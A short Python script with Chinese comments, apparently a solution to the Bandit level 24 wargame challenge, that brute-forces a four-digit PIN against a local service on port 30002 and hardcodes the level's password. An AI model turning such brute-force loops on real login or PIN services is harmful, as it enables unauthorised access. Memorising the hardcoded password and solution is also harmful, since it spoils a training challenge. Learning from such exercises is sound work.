import sys
import socket

pin = 0000
b24pass = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

ConnectToServer = socket.socket()
ConnectToServer.connect(("127.0.0.1", 30002))
#发起连接
while pin < 10000:
    pin_string = str(pin).zfill(4)
    message = b24pass+" "+pin_string+"\n"
#拼接bandit24密码和pin码，中间加空格。
    ConnectToServer.send(message.encode())
    #发送拼接后的密码
    receive_msg = ConnectToServer.recv(1024).decode()
    #接收服务端发来的信息。
    if "Correct!" not in receive_msg:
        print("WrongPIN:%s" % pin_string)
    else:
        print(receive_msg)
        break
    #判断信息中是否包含“Correct！”
    pin += 1
